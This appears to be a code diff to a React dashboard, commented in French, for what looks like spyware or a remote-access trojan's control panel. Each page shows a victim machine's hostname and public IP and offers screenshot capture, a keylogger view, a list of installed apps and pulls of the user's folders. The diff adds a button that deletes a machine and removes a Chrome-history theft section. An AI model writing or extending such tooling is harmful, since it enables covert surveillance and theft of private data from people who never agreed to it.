@@ -1,14 +1,14 @@
 import { useState, useEffect, useRef } from 'react'
 import { useParams, useNavigate } from 'react-router-dom'
 import {
-  ArrowLeft, Camera, Keyboard, Globe, Package, FolderOpen, Loader2,
+  ArrowLeft, Camera, Keyboard, Package, FolderOpen, Loader2, Trash2,
 } from 'lucide-react'
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
 import { Button } from '@/components/ui/button'
 import { Badge } from '@/components/ui/badge'
 import { Separator } from '@/components/ui/separator'
 import { Skeleton } from '@/components/ui/skeleton'
-import { fetchMachine, sendCommand, fetchResult, getDownloadUrl } from '@/services/api'
+import { fetchMachine, sendCommand, fetchResult, getDownloadUrl, deleteMachine } from '@/services/api'
 import { cn } from '@/lib/utils'
 
 // Hook qui envoie une commande et poll le résultat toutes les 3s jusqu'à réception
@@ -244,18 +244,31 @@ export default function MachineDetail() {
   }
 
   const status = getMachineStatus(machine.last_seen)
+  const [deleting, setDeleting] = useState(false)
 
   const FOLDERS = ['Documents', 'Images', 'Videos', 'Bureau']
+
+  async function handleDelete() {
+    if (!confirm(`Supprimer la machine "${machine.hostname}" ? Cette action est irréversible.`))
+      return
+    setDeleting(true)
+    try {
+      await deleteMachine(id)
+      navigate('/')
+    } catch {
+      setDeleting(false)
+    }
+  }
 
   return (
     <div className="flex flex-col gap-6 p-6">
 
-      {/* En-tête : retour + infos machine */}
+      {/* En-tête : retour + infos machine + bouton supprimer */}
       <div className="flex items-center gap-3">
         <Button variant="ghost" size="icon" onClick={() => navigate('/')} className="h-8 w-8">
           <ArrowLeft className="h-4 w-4" />
         </Button>
-        <div>
+        <div className="flex-1">
           <div className="flex items-center gap-2">
             <h1 className="text-xl font-semibold font-mono">{machine.hostname}</h1>
             <Badge variant="outline" className={cn('text-xs', status.cls)}>
@@ -268,6 +281,15 @@ export default function MachineDetail() {
             {machine.public_ip  && ` · Publique : ${machine.public_ip}`}
           </p>
         </div>
+        <Button
+          variant="destructive" size="sm"
+          disabled={deleting}
+          onClick={handleDelete}
+          className="gap-2 h-7 text-xs"
+        >
+          {deleting ? <Loader2 className="h-3 w-3 animate-spin" /> : <Trash2 className="h-3 w-3" />}
+          {deleting ? 'Suppression...' : 'Supprimer'}
+        </Button>
       </div>
 
       {/* Screenshot */}
@@ -277,17 +299,6 @@ export default function MachineDetail() {
 
       {/* Keylogger */}
       <KeylogSection machineId={id} />
-
-      {/* Historique de navigation Chrome */}
-      <ActionSection title="Historique Chrome" icon={Globe} commandName="browser_history" machineId={id}>
-        {(result) => (
-          <JsonTableResult result={result} columns={[
-            { key: 'title',  label: 'Titre' },
-            { key: 'url',    label: 'URL' },
-            { key: 'visits', label: 'Visites' },
-          ]} />
-        )}
-      </ActionSection>
 
       {/* Applications installées */}
       <ActionSection title="Applications installées" icon={Package} commandName="apps" machineId={id}>
